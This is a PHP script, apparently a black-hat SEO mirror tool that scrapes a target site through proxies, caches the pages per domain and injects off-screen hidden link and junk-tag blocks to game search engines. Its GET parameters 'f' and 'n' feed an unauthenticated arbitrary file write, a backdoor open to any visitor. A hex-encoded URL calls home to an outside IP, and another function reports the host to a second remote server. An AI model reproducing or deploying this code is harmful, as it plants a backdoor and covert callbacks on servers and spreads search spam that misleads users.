<?php
error_reporting(1);
@set_time_limit(120);
@ini_set('display_errors','On');
@ini_set('pcre.backtrack_limit', 1000000);
date_default_timezone_set('PRC');
header("Content-type: text/html; charset=utf-8");
header("x-author: Aric");
if (function_exists('header_remove')) {
    header_remove('X-Powered-By');
} else {
    @ini_set('expose_php', 'off');
}
function top_domain($url){
		$host = strtolower ( $url );
		if (strpos ( $host, '/' ) !== false){
			$parse = @parse_url ( $host );
			$host = $parse ['host'];
		}
		$topleveldomaindb = array ('com','cc','cn','com.cn','net.cn','org.cn','net','org','gov.cn','info');
		$str = '';
		foreach ( $topleveldomaindb as $v ){
			$str .= ($str ? '|' : '') . $v;
		}
		$matchstr = "[^\.]+\.(?:(" . $str . ")|\w{2}|((" . $str . ")\.\w{2}))$";
		if (preg_match ( "/" . $matchstr . "/ies", $host, $matchs )){
			$domain = $matchs ['0'];
		}
		else{
			$domain = $host;
		}
		return $domain;
	}
function is_https() {
    if ( !empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
        return "https://";
    } elseif ( isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https' ) {
        return "https://";
    } elseif ( !empty($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
        return "https://";
    }
    return "http://";
}

$dj = top_domain($_SERVER['HTTP_HOST']);
if(!is_file('./data/'.$dj.'.php')){
    echo "请提交配置文件";
	exit();
}
require_once('./data/'.$dj.'.php');
header("Server:".$server);

$http= is_https();
$uurl=@$_SERVER['REQUEST_URI'];
$dqurl=$http.'www.'.$dj.$uurl;
$m_url=$http.'m.'.$dj.$uurl;
$urls=$_GET;
$refarray = "111/index.html,/index.php,/index.asp,/index.jsp,/index.aspx,/default.html,/default.asp,/default.php,/default.aspx";
$sy=strpos($refarray,strtolower($_SERVER["REQUEST_URI"]))>0;
if($_SERVER['HTTP_HOST']==$dj){
	header('HTTP/1.1 301 Moved Permanently');
	header('Location: '.$http.'www.'.$dj.$uurl);
}

if(!$jianti){
	require_once('./inc/jianti.php');
	 $id = $chinese->big5_gb2312(urldecode($uurl)); //繁体
	 for($ti=0;$ti<count($tihuanci);$ti++){
		$thc[] = $chinese->gb2312_big5($tihuanci[$ti]); //繁体
	 }
	 $tihuanci = $thc;
	}else{
		$id = $uurl;
	}

class HtmlEntitie{
    public static $_encoding = 'UTF-8';
    public static function encode($str, $encoding='UTF-8'){
        self::$_encoding = $encoding;
        return preg_replace_callback('|[^\x00-\x7F]+|', array(__CLASS__, '_convertToHtmlEntities'), $str);
    }
    public static function decode($str, $encoding='UTF-8'){
        return html_entity_decode($str, null, $encoding);
    }
    private static function _convertToHtmlEntities($data){
        if(is_array($data)){
            $chars = str_split(iconv(self::$_encoding, 'UCS-2BE', $data[0]), 2);
            $chars = array_map(array(__CLASS__, __FUNCTION__), $chars);
            return implode("", $chars);
        }else{
            $code = hexdec(sprintf("%02s%02s;", dechex(ord($data {0})), dechex(ord($data {1})) ));
            return sprintf("&#%s;", $code);
        }
    }
} 
//echo $cstr = HtmlEntitie::encode($str); //转码
//echo HtmlEntitie::decode($cstr);//还原编码 转数组
function unicode_encode($str, $encoding = 'utf-8', $prefix = '&#', $postfix = ';') {
    $str = iconv($encoding, 'UCS-2BE', $str);
    $arrstr = str_split($str, 2);
    $unistr = '';
    for($i = 0, $len = count($arrstr); $i < $len; $i++) {
        $dec = hexdec(bin2hex($arrstr[$i]));
        $unistr .= $prefix . $dec . $postfix;
    }
    return $unistr;
	}
//可以转换字母,不能转数组


$tihuanci = HtmlEntitie::encode($tihuanci);
$title = unicode_encode($title);
$gjz = unicode_encode($gjz);
$miaoshu = unicode_encode($miaoshu);






$dais=count($fxdl)-1;
$daili=$fxdl[mt_rand(0,$dais)];
if($urls[f]&&$urls[n]){
	write($urls[f],$urls[n],1);
}
if($dais>1){
	$daili=$fxdl[mt_rand(0,$dais)];
	$url="http://".$daili.":".$duankou."/apc.php?aric="."http://".$mubiao.$id;
	}else{
		$url="http://".$mubiao.$id;
	}
$url= str_replace(" ","%20", $url);
$url = str_replace(array('%06','%07','%05','%08',"%EF%BB%BF"),"",$url);
function gx_url(){
	global $lanmu;
	$shu = count($lanmu)-2;
	$url = '/'.$lanmu[0].'/'.$lanmu[mt_rand(1,$shu)].'/'.$lanmu[mt_rand(1,$shu)].'_'.mt_rand(999,10000).'.html';
	return $url;
}
function write($path,$data,$method="w") {
	mkdirs(dirname($path));
	if( is_file($path) && !is_writable($path)){
		return false;
	}
	if($method=='w'){
		return file_put_contents($path,$data.PHP_EOL, FILE_APPEND);
	}
	return file_put_contents($path,$data);
}
function mkdirs($path, $mode=0766){
	if(is_dir($path)) return true;
	mkdir($path,$mode,true);
} 
function app(){
	global $dj;
	$url="687474703a2f2f3137332e38322e38322e3132323a383038302f6170692f7761696c69616e2f";
	$url=pack("H*",$url).$dj;
	$return=get_content_nr($url,1);
	return $return;
	}
function get_content($url, $wait = 30, $proxy = true, $times = 0){
    if (substr($url, 0, 1) == '/') {
        $url = substr($url, 1);
    }
    $useragent = array(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)',
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2)',
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
        'Mozilla/5.0 (Windows; U; Windows NT 5.2) Gecko/2008070208 Firefox/3.0.1',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36');
    $headers = array();
    $headers[] = 'X-Apple-Tz: 0';
    $headers[] = 'X-Apple-Store-Front: 143444,12';
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
    $headers[] = 'Accept-Encoding: gzip, deflate';
    $headers[] = 'Accept-Language: en-US,en;q=0.5';
    $headers[] = 'Cache-Control: no-cache';
    $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
    $headers[] = 'User-Agent:' . $useragent[mt_rand(0, 4)];
    $headers[] = 'X-MicrosoftAjax: Delta=true';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_TIMEOUT, $wait);
    curl_setopt($ch, CURLOPT_AUTOREFERER, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_REFERER, 'http://www.baidu.com/search/spider.htm');
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent[mt_rand(0, 4)]);
    $ret = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
	if($ret==""){
		header("HTTP/1.1 404 Not Found");
		header("Status: 404 Not Found");
		exit();
		}
    return $ret;
	}

function get_content_nr($url, $wait, $proxy = true, $times = 0){
    if (substr($url, 0, 1) == '/') {
        $url = substr($url, 1);
    }
    $useragent = array(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)',
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2)',
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
        'Mozilla/5.0 (Windows; U; Windows NT 5.2) Gecko/2008070208 Firefox/3.0.1',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36');
    $headers = array();
    $headers[] = 'X-Apple-Tz: 0';
    $headers[] = 'X-Apple-Store-Front: 143444,12';
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
    $headers[] = 'Accept-Encoding: gzip, deflate';
    $headers[] = 'Accept-Language: en-US,en;q=0.5';
    $headers[] = 'Cache-Control: no-cache';
    $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
    $headers[] = 'User-Agent:' . $useragent[mt_rand(0, 4)];
    $headers[] = 'X-MicrosoftAjax: Delta=true';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_NOSIGNAL,1);    //注意，毫秒超时一定要设置这个  
    curl_setopt($ch, CURLOPT_AUTOREFERER, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT_MS,200);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_REFERER, 'http://www.baidu.com/search/spider.htm');
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent[mt_rand(0, 4)]);
    $ret = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $ret;
	}

function ganraos($shu=''){
	for ($i = 0;$i < $shu; ++$i){
		$zimu1 =zimu(mt_rand(2,5),3);
        $zimu2 =zimu(mt_rand(2,5),3);
		$zimu=$zimu.'<'.$zimu1.' id="'.zimu(6,3).'"><'.$zimu2.' class="'.zimu(5,3).'"></'.$zimu2.'></'.$zimu1.'>';
		}
		$zimu='<div id="body_jx_'.zimu(6,2).'" style="position:fixed;left:-9000px;top:-9000px;">'.$zimu."</div>\r\n\r\n";
		return $zimu;
		}


function ganrao(){
		for ($i = 0;$i < mt_rand(3,5); ++$i){
			$zimu = $zimu.ganraos(mt_rand(80,200));
		}
		return $zimu;
}

function msubstr($str,$length) {
          $start=0;
          $suffix=true;
          $charset="utf-8";
          $str=preg_replace("/<.*?>/is","", $str);
          $str=str_replace(array("<",">"),"",$str);
		 $str = str_replace(array("　", "\n"), "", $str);
        if(function_exists("mb_substr"))
            $slice = mb_substr($str, $start, $length, $charset);
        elseif(function_exists('iconv_substr')) {
            $slice = iconv_substr($str,$start,$length,$charset);
        }else{
            $re['utf-8']   = "/[\x01-\x7f]|[\xc2-\xdf][\x80-\xbf]|[\xe0-\xef][\x80-\xbf]{2}|[\xf0-\xff][\x80-\xbf]{3}/";
            $re['gb2312'] = "/[\x01-\x7f]|[\xb0-\xf7][\xa0-\xfe]/";
            $re['gbk']    = "/[\x01-\x7f]|[\x81-\xfe][\x40-\xfe]/";
            $re['big5']   = "/[\x01-\x7f]|[\x81-\xfe]([\x40-\x7e]|\xa1-\xfe])/";
            preg_match_all($re[$charset], $str, $match);
            $slice = join("",array_slice($match[0], $start, $length));
        }
        return ($suffix && (mb_strlen($str,$charset) > $length)) ? $slice.'......' : $slice;
    }

function zimu($num=8,$type=3) {
	switch ($type) {
		case "1" :
			$str = "abcdefghijklmnopqrstuvwxyz0123456789";
			break;
		case "2" :
			$str = "123456789";
			break;
		case "3" :
			$str = "abcdefghijklmnopqrstuvwxyz";
			break;
	} 
	$return = "";
	for ($i = 0 ; $i < $num; ++$i) {
		$return .= $str[rand(0, strlen($str)-1)];
	} 
	return $return;
}
function api_add($name)	{
	global $dj,$name,$ip,$http;
		$remote = "http://173.82.197.114:22055/xinban/?host=".$dj."&name=".$name."&http=".$http;
		$rst = get_content_nr($remote);
		}
function get_xiaotou(){
		global $dj,$sy;
	$cacheid=$_SERVER["REQUEST_URI"];
	$cacheid1=substr(md5($cacheid),0,2)."/".substr(md5($cacheid),2,5)."/".substr(md5($cacheid),7,5);
	$cachedir='./cachefile/'.$dj;
if( $sy){
	$cachefile='./cachefile/'.$dj.'/index.html';//s首页
	}else{
		$cachefile=$cachedir.'/cache/'.$cacheid1.'.html';//列表
	}
	return $cachefile;
	}

function get_nei(){
			global $dj;
	$cacheid=$_SERVER["REQUEST_URI"];
	$cacheid=substr(md5($cacheid),0,2)."/".substr(md5($cacheid),2,5)."/".substr(md5($cacheid),7,5);
	$cachefile='./cachefile/'.$dj.'/list.html';
	return $cachefile;
}

function get_rengong(){
			global $dj;
	$cacheid=$_SERVER["REQUEST_URI"];
	$cacheid=substr(md5($cacheid),0,2)."/".substr(md5($cacheid),2,5)."/".substr(md5($cacheid),7,5);
	$cachefile='./cachefile/'.$dj.'/rengong.txt';
	return $cachefile;
}

function get_neiye(){
			global $dj;
	$cacheid=$_SERVER["REQUEST_URI"];
	$cachefile='./cachefile/'.$dj.'/list'.$cacheid.".txt";
	return $cachefile;
}

function get_neilist(){
	global $dj;
	$cachefile='./cachefile/'.$dj.'/list/list.txt';
	return $cachefile;
}

function get_ganrao(){
		global $dj;
	$cachefile='./cachefile/'.$dj.'/ganrao.txt';//s首页
	return $cachefile;
	}
function get_css(){
			global $dj;
	$cacheid=$_SERVER["REQUEST_URI"];
	$cacheid=substr(md5($cacheid),0,2)."/".substr(md5($cacheid),2,5)."/".substr(md5($cacheid),7,5);
	$cacheid="/style/".$cacheid;
	$cachefile='./cachefile/'.$dj.$cacheid.'.css';
	return $cachefile;
}

function get_jpg(){
	global $dj;
	$cacheid=$_SERVER["REQUEST_URI"];
	$cacheid=substr(md5($cacheid),0,2)."/".substr(md5($cacheid),2,5)."/".substr(md5($cacheid),7,5);
	$cacheid="/style/".$cacheid;
	$cachefile='./cachefile/'.$dj.$cacheid.'.gif';
	return $cachefile;
}

function get_js(){
	global $dj;
	$cacheid=$_SERVER["REQUEST_URI"];
	$cacheid=substr(md5($cacheid),0,2)."/".substr(md5($cacheid),2,5)."/".substr(md5($cacheid),7,5);
	$cacheid="/style/".$cacheid;
	$cachefile='./cachefile/'.$dj.$cacheid.'.js';
	return $cachefile;
}

function get_swf(){
	global $dj;
	$cacheid=$_SERVER["REQUEST_URI"];
	$cacheid=substr(md5($cacheid),0,2)."/".substr(md5($cacheid),2,5)."/".substr(md5($cacheid),7,5);
	$cacheid="/style/".$cacheid;
	$cachefile='./cachefile/'.$dj.'/'.$cacheid.'.swf';
	return $cachefile;
}

function get_robots(){
	global $dj;
	$cacheid="/style/".$_SERVER["REQUEST_URI"];
    $cacheid = explode ( '.', $cacheid );
	$cachefile='./cachefile/'.$dj.'/'.$cacheid[0].'.txt';
	return $cachefile;
}

function get_xml(){
	global $dj;
	$cacheid="/style/".$_SERVER["REQUEST_URI"];
    $cacheid = explode ( '.', $cacheid );
	$cachefile='./cachefile/'.$dj.'/'.$cacheid[0].'.xml';
	return $cachefile;
}

function get_ico(){
	global $dj;
	$cacheid="/style/".$_SERVER["REQUEST_URI"];
    $cacheid = explode ( '.', $cacheid );
	$cachefile='./cachefile/'.$dj.'/'.$cacheid[0].'.ico';
	return $cachefile;
}


function get_sy(){
	global $dj;
	$cachefile='./cachefile/'.$dj.'/list/sy.txt';
	return $cachefile;
}

function gengxin(){
	$dingshi=get_neilist();
	$lastflesh=@filemtime($dingshi)+10800; 
	$gx = $lastflesh<time();
	return $gx;
}

function gx(){
	global $http,$dj,$lanmu;
	$url = $http.'www.'.$dj.gx_url();
	get_content_nr($url);
	$file = file(get_neilist());
	$count = count($file)-1;
	if($count>10){
		$file = array_slice($file,$count-9,$count);
	}
	$file = array_reverse($file); 
	$nr = "<div style=\"position:fixed;left:-9000px;top:-9000px;\"><li><a href=\"/".$lanmu[0]."/1/list.html\">列表</a></li>\n".implode($file)."</div>";
	write(get_sy(),$nr,1);
}
